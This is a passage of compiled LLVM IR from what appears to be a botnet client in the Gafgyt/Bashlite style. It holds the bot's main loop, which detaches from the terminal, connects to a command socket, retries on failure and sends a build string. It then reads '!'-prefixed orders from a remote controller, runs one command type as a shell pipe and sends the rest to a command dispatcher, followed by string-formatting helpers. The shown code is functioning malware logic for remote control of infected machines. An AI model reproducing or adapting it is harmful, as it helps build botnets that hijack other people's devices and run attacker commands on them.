  %76 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i64 0, i64 0)) #12
  %77 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #12
  br label %78

78:                                               ; preds = %74, %81, %371
  %79 = call i32 @initConnection()
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %83

81:                                               ; preds = %78
  %82 = call i32 @sleep(i32 5)
  br label %78

83:                                               ; preds = %78
  %84 = load i32, i32* @mainCommSock, align 4
  %85 = call i8* @getBuild()
  %86 = call i32 (i32, i8*, ...) @sockprintf(i32 %84, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.120, i64 0, i64 0), i8* %85)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %87

87:                                               ; preds = %370, %292, %214, %176, %83
  %88 = load i32, i32* @mainCommSock, align 4
  %89 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %90 = call i32 @recvLine(i32 %88, i8* %89, i32 4096)
  store i32 %90, i32* %11, align 4
  %91 = icmp ne i32 %90, -1
  br i1 %91, label %92, label %371

92:                                               ; preds = %87
  store i32 0, i32* %12, align 4
  br label %93

93:                                               ; preds = %164, %92
  %94 = load i32, i32* %12, align 4
  %95 = sext i32 %94 to i64
  %96 = load i64, i64* @numpids, align 8
  %97 = icmp ult i64 %95, %96
  br i1 %97, label %98, label %167

98:                                               ; preds = %93
  %99 = load i32*, i32** @pids, align 8
  %100 = load i32, i32* %12, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i32, i32* %99, i64 %101
  %103 = load i32, i32* %102, align 4
  %104 = call i32 @waitpid(i32 %103, i32* null, i32 1)
  %105 = icmp sgt i32 %104, 0
  br i1 %105, label %106, label %163

106:                                              ; preds = %98
  %107 = load i32, i32* %12, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %14, align 4
  br label %109

109:                                              ; preds = %125, %106
  %110 = load i32, i32* %14, align 4
  %111 = zext i32 %110 to i64
  %112 = load i64, i64* @numpids, align 8
  %113 = icmp ult i64 %111, %112
  br i1 %113, label %114, label %128

114:                                              ; preds = %109
  %115 = load i32*, i32** @pids, align 8
  %116 = load i32, i32* %14, align 4
  %117 = zext i32 %116 to i64
  %118 = getelementptr inbounds i32, i32* %115, i64 %117
  %119 = load i32, i32* %118, align 4
  %120 = load i32*, i32** @pids, align 8
  %121 = load i32, i32* %14, align 4
  %122 = sub i32 %121, 1
  %123 = zext i32 %122 to i64
  %124 = getelementptr inbounds i32, i32* %120, i64 %123
  store i32 %119, i32* %124, align 4
  br label %125

125:                                              ; preds = %114
  %126 = load i32, i32* %14, align 4
  %127 = add i32 %126, 1
  store i32 %127, i32* %14, align 4
  br label %109, !llvm.loop !58

128:                                              ; preds = %109
  %129 = load i32*, i32** @pids, align 8
  %130 = load i32, i32* %14, align 4
  %131 = sub i32 %130, 1
  %132 = zext i32 %131 to i64
  %133 = getelementptr inbounds i32, i32* %129, i64 %132
  store i32 0, i32* %133, align 4
  %134 = load i64, i64* @numpids, align 8
  %135 = add i64 %134, -1
  store i64 %135, i64* @numpids, align 8
  %136 = load i64, i64* @numpids, align 8
  %137 = add i64 %136, 1
  %138 = mul i64 %137, 4
  %139 = call noalias align 16 i8* @malloc(i64 %138) #12
  %140 = bitcast i8* %139 to i32*
  store i32* %140, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %141

141:                                              ; preds = %156, %128
  %142 = load i32, i32* %14, align 4
  %143 = zext i32 %142 to i64
  %144 = load i64, i64* @numpids, align 8
  %145 = icmp ult i64 %143, %144
  br i1 %145, label %146, label %159

146:                                              ; preds = %141
  %147 = load i32*, i32** @pids, align 8
  %148 = load i32, i32* %14, align 4
  %149 = zext i32 %148 to i64
  %150 = getelementptr inbounds i32, i32* %147, i64 %149
  %151 = load i32, i32* %150, align 4
  %152 = load i32*, i32** %13, align 8
  %153 = load i32, i32* %14, align 4
  %154 = zext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  store i32 %151, i32* %155, align 4
  br label %156

156:                                              ; preds = %146
  %157 = load i32, i32* %14, align 4
  %158 = add i32 %157, 1
  store i32 %158, i32* %14, align 4
  br label %141, !llvm.loop !59

159:                                              ; preds = %141
  %160 = load i32*, i32** @pids, align 8
  %161 = bitcast i32* %160 to i8*
  call void @free(i8* %161) #12
  %162 = load i32*, i32** %13, align 8
  store i32* %162, i32** @pids, align 8
  br label %163

163:                                              ; preds = %159, %98
  br label %164

164:                                              ; preds = %163
  %165 = load i32, i32* %12, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %12, align 4
  br label %93, !llvm.loop !60

167:                                              ; preds = %93
  %168 = load i32, i32* %11, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %169
  store i8 0, i8* %170, align 1
  %171 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  call void @trim(i8* %171)
  %172 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %173 = call i8* @strstr(i8* %172, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i64 0, i64 0)) #11
  %174 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %175 = icmp eq i8* %173, %174
  br i1 %175, label %176, label %179

176:                                              ; preds = %167
  %177 = load i32, i32* @mainCommSock, align 4
  %178 = call i32 (i32, i8*, ...) @sockprintf(i32 %177, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.121, i64 0, i64 0))
  br label %87, !llvm.loop !61

179:                                              ; preds = %167
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %181 = call i8* @strstr(i8* %180, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i64 0, i64 0)) #11
  %182 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %183 = icmp eq i8* %181, %182
  br i1 %183, label %184, label %185

184:                                              ; preds = %179
  call void @exit(i32 0) #16
  unreachable

185:                                              ; preds = %179
  %186 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  store i8* %186, i8** %15, align 8
  %187 = load i8*, i8** %15, align 8
  %188 = load i8, i8* %187, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 33
  br i1 %190, label %191, label %370

191:                                              ; preds = %185
  %192 = load i8*, i8** %15, align 8
  %193 = getelementptr inbounds i8, i8* %192, i64 1
  store i8* %193, i8** %16, align 8
  br label %194

194:                                              ; preds = %206, %191
  %195 = load i8*, i8** %16, align 8
  %196 = load i8, i8* %195, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp ne i32 %197, 32
  br i1 %198, label %199, label %204

199:                                              ; preds = %194
  %200 = load i8*, i8** %16, align 8
  %201 = load i8, i8* %200, align 1
  %202 = zext i8 %201 to i32
  %203 = icmp ne i32 %202, 0
  br label %204

204:                                              ; preds = %199, %194
  %205 = phi i1 [ false, %194 ], [ %203, %199 ]
  br i1 %205, label %206, label %209

206:                                              ; preds = %204
  %207 = load i8*, i8** %16, align 8
  %208 = getelementptr inbounds i8, i8* %207, i32 1
  store i8* %208, i8** %16, align 8
  br label %194, !llvm.loop !62

209:                                              ; preds = %204
  %210 = load i8*, i8** %16, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 0
  br i1 %213, label %214, label %215

214:                                              ; preds = %209
  br label %87, !llvm.loop !61

215:                                              ; preds = %209
  %216 = load i8*, i8** %16, align 8
  store i8 0, i8* %216, align 1
  %217 = load i8*, i8** %15, align 8
  %218 = getelementptr inbounds i8, i8* %217, i64 1
  store i8* %218, i8** %16, align 8
  %219 = load i8*, i8** %15, align 8
  %220 = load i8*, i8** %16, align 8
  %221 = call i64 @strlen(i8* %220) #11
  %222 = getelementptr inbounds i8, i8* %219, i64 %221
  %223 = getelementptr inbounds i8, i8* %222, i64 2
  store i8* %223, i8** %15, align 8
  br label %224

224:                                              ; preds = %244, %215
  %225 = load i8*, i8** %15, align 8
  %226 = load i8*, i8** %15, align 8
  %227 = call i64 @strlen(i8* %226) #11
  %228 = sub i64 %227, 1
  %229 = getelementptr inbounds i8, i8* %225, i64 %228
  %230 = load i8, i8* %229, align 1
  %231 = zext i8 %230 to i32
  %232 = icmp eq i32 %231, 10
  br i1 %232, label %242, label %233

233:                                              ; preds = %224
  %234 = load i8*, i8** %15, align 8
  %235 = load i8*, i8** %15, align 8
  %236 = call i64 @strlen(i8* %235) #11
  %237 = sub i64 %236, 1
  %238 = getelementptr inbounds i8, i8* %234, i64 %237
  %239 = load i8, i8* %238, align 1
  %240 = zext i8 %239 to i32
  %241 = icmp eq i32 %240, 13
  br label %242

242:                                              ; preds = %233, %224
  %243 = phi i1 [ true, %224 ], [ %241, %233 ]
  br i1 %243, label %244, label %250

244:                                              ; preds = %242
  %245 = load i8*, i8** %15, align 8
  %246 = load i8*, i8** %15, align 8
  %247 = call i64 @strlen(i8* %246) #11
  %248 = sub i64 %247, 1
  %249 = getelementptr inbounds i8, i8* %245, i64 %248
  store i8 0, i8* %249, align 1
  br label %224, !llvm.loop !63

250:                                              ; preds = %242
  %251 = load i8*, i8** %15, align 8
  store i8* %251, i8** %17, align 8
  br label %252

252:                                              ; preds = %264, %250
  %253 = load i8*, i8** %15, align 8
  %254 = load i8, i8* %253, align 1
  %255 = zext i8 %254 to i32
  %256 = icmp ne i32 %255, 32
  br i1 %256, label %257, label %262

257:                                              ; preds = %252
  %258 = load i8*, i8** %15, align 8
  %259 = load i8, i8* %258, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp ne i32 %260, 0
  br label %262

262:                                              ; preds = %257, %252
  %263 = phi i1 [ false, %252 ], [ %261, %257 ]
  br i1 %263, label %264, label %267

264:                                              ; preds = %262
  %265 = load i8*, i8** %15, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %15, align 8
  br label %252, !llvm.loop !64

267:                                              ; preds = %262
  %268 = load i8*, i8** %15, align 8
  store i8 0, i8* %268, align 1
  %269 = load i8*, i8** %15, align 8
  %270 = getelementptr inbounds i8, i8* %269, i32 1
  store i8* %270, i8** %15, align 8
  %271 = load i8*, i8** %17, align 8
  store i8* %271, i8** %18, align 8
  br label %272

272:                                              ; preds = %276, %267
  %273 = load i8*, i8** %18, align 8
  %274 = load i8, i8* %273, align 1
  %275 = icmp ne i8 %274, 0
  br i1 %275, label %276, label %285

276:                                              ; preds = %272
  %277 = load i8*, i8** %18, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  %280 = call i32 @toupper(i32 %279) #11
  %281 = trunc i32 %280 to i8
  %282 = load i8*, i8** %18, align 8
  store i8 %281, i8* %282, align 1
  %283 = load i8*, i8** %18, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %18, align 8
  br label %272, !llvm.loop !65

285:                                              ; preds = %272
  %286 = load i8*, i8** %17, align 8
  %287 = call i32 @strcmp(i8* %286, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.123, i64 0, i64 0)) #11
  %288 = icmp eq i32 %287, 0
  br i1 %288, label %289, label %312

289:                                              ; preds = %285
  %290 = call i32 @listFork()
  %291 = icmp ne i32 %290, 0
  br i1 %291, label %292, label %293

292:                                              ; preds = %289
  br label %87, !llvm.loop !61

293:                                              ; preds = %289
  %294 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %294, i8 0, i64 1024, i1 false)
  %295 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %296 = load i8*, i8** %15, align 8
  %297 = call i32 (i8*, i8*, ...) @szprintf(i8* %295, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.124, i64 0, i64 0), i8* %296)
  %298 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %299 = call i32 @fdpopen(i8* %298, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i64 0, i64 0))
  store i32 %299, i32* %20, align 4
  br label %300

300:                                              ; preds = %305, %293
  %301 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  %302 = load i32, i32* %20, align 4
  %303 = call i8* @fdgets(i8* %301, i32 1024, i32 %302)
  %304 = icmp ne i8* %303, null
  br i1 %304, label %305, label %309

305:                                              ; preds = %300
  %306 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  call void @trim(i8* %306)
  %307 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %307, i8 0, i64 1024, i1 false)
  %308 = call i32 @sleep(i32 1)
  br label %300, !llvm.loop !66

309:                                              ; preds = %300
  %310 = load i32, i32* %20, align 4
  %311 = call i32 @fdpclose(i32 %310)
  call void @exit(i32 0) #16
  unreachable

312:                                              ; preds = %285
  store i32 1, i32* %22, align 4
  %313 = load i8*, i8** %15, align 8
  %314 = call i8* @strtok(i8* %313, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i64 0, i64 0)) #12
  store i8* %314, i8** %23, align 8
  %315 = load i8*, i8** %17, align 8
  %316 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %315, i8** %316, align 16
  br label %317

317:                                              ; preds = %348, %312
  %318 = load i8*, i8** %23, align 8
  %319 = icmp ne i8* %318, null
  br i1 %319, label %320, label %350

320:                                              ; preds = %317
  %321 = load i8*, i8** %23, align 8
  %322 = load i8, i8* %321, align 1
  %323 = zext i8 %322 to i32
  %324 = icmp ne i32 %323, 10
  br i1 %324, label %325, label %348

325:                                              ; preds = %320
  %326 = load i8*, i8** %23, align 8
  %327 = call i64 @strlen(i8* %326) #11
  %328 = add i64 %327, 1
  %329 = call noalias align 16 i8* @malloc(i64 %328) #12
  %330 = load i32, i32* %22, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %331
  store i8* %329, i8** %332, align 8
  %333 = load i32, i32* %22, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %334
  %336 = load i8*, i8** %335, align 8
  %337 = load i8*, i8** %23, align 8
  %338 = call i64 @strlen(i8* %337) #11
  %339 = add i64 %338, 1
  call void @llvm.memset.p0i8.i64(i8* align 1 %336, i8 0, i64 %339, i1 false)
  %340 = load i32, i32* %22, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %341
  %343 = load i8*, i8** %342, align 8
  %344 = load i8*, i8** %23, align 8
  %345 = call i8* @strcpy(i8* %343, i8* %344) #12
  %346 = load i32, i32* %22, align 4
  %347 = add nsw i32 %346, 1
  store i32 %347, i32* %22, align 4
  br label %348

348:                                              ; preds = %325, %320
  %349 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i64 0, i64 0)) #12
  store i8* %349, i8** %23, align 8
  br label %317, !llvm.loop !67

350:                                              ; preds = %317
  %351 = load i32, i32* %22, align 4
  %352 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  call void @processCmd(i32 %351, i8** %352)
  %353 = load i32, i32* %22, align 4
  %354 = icmp sgt i32 %353, 1
  br i1 %354, label %355, label %369

355:                                              ; preds = %350
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %356

356:                                              ; preds = %365, %355
  %357 = load i32, i32* %24, align 4
  %358 = load i32, i32* %22, align 4
  %359 = icmp slt i32 %357, %358
  br i1 %359, label %360, label %368

360:                                              ; preds = %356
  %361 = load i32, i32* %24, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %362
  %364 = load i8*, i8** %363, align 8
  call void @free(i8* %364) #12
  br label %365

365:                                              ; preds = %360
  %366 = load i32, i32* %24, align 4
  %367 = add nsw i32 %366, 1
  store i32 %367, i32* %24, align 4
  br label %356, !llvm.loop !68

368:                                              ; preds = %356
  br label %369

369:                                              ; preds = %368, %350
  br label %370

370:                                              ; preds = %369, %185
  br label %87, !llvm.loop !61

371:                                              ; preds = %87
  br label %78
}

declare i32 @printf(i8*, ...) #5

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #5

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @prints(i8** %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

15:                                               ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

17:                                               ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

21:                                               ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

24:                                               ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17, !llvm.loop !69

27:                                               ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

31:                                               ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

32:                                               ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

36:                                               ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

41:                                               ; preds = %40, %36
  br label %42

42:                                               ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

46:                                               ; preds = %42
  br label %47

47:                                               ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

50:                                               ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

55:                                               ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47, !llvm.loop !70

58:                                               ; preds = %47
  br label %59

59:                                               ; preds = %58, %42
  br label %60

60:                                               ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

64:                                               ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

71:                                               ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60, !llvm.loop !71

74:                                               ; preds = %60
  br label %75

75:                                               ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

78:                                               ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

83:                                               ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75, !llvm.loop !72

86:                                               ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @printi(i8** %0, i32 %1, i32 %2, i32 %3, i32 %4, i32 %5, i32 %6) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

25:                                               ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

33:                                               ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

36:                                               ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

39:                                               ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

42:                                               ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

45:                                               ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

50:                                               ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

53:                                               ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

59:                                               ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

65:                                               ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50, !llvm.loop !73

74:                                               ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

77:                                               ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

80:                                               ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

84:                                               ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

90:                                               ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

93:                                               ; preds = %90, %84
  br label %94

94:                                               ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

102:                                              ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @printchar(i8** %0, i32 %1) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

7:                                                ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

15:                                               ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

18:                                               ; preds = %15, %7
  ret void
}

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nofree nosync nounwind willreturn }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nounwind returns_twice "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { noreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #8 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { argmemonly nofree nounwind willreturn }
attributes #10 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #11 = { nounwind readonly willreturn }
attributes #12 = { nounwind }
attributes #13 = { nounwind returns_twice }
attributes #14 = { noreturn }
attributes #15 = { nounwind readnone willreturn }
